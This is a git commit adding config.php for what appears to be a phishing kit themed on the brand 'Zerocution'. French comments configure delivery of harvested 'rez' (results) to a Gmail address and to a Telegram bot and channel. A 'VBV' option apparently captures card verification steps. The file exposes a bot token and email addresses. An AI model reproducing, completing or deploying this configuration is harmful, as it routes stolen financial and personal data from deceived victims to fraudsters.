cd7ce42fbe54ef461e7f913e00c3f91613bf2049
Haribo422 <abondy62@gmail.com>
2024-07-13 04:06:44 +0200

    Add files via upload

---
+++ config.php
@@ -0,0 +1,24 @@
+<?php
+
+#zerocution
+
+# Mail
+$mail_send = true;                                           # False pour ne pas recevoir par Mail
+$rezmail = "noelruel6@gmail.com";
+
+#Telegram
+$tlg_send = true;                                       # False pour ne pas recevoir par Telegram
+$bot_token = "7297308732:AAFlJbi2pw2NrikW70LaYPAEkr7B9Jv8Krg";
+
+$rez_chat = "-4214081295";                                 # Channel de réception des informations
+
+# VBV
+
+$vbv = true;
+$timeVBV = "40";
+
+# DEV
+
+$test_mode = false;
+
+?>
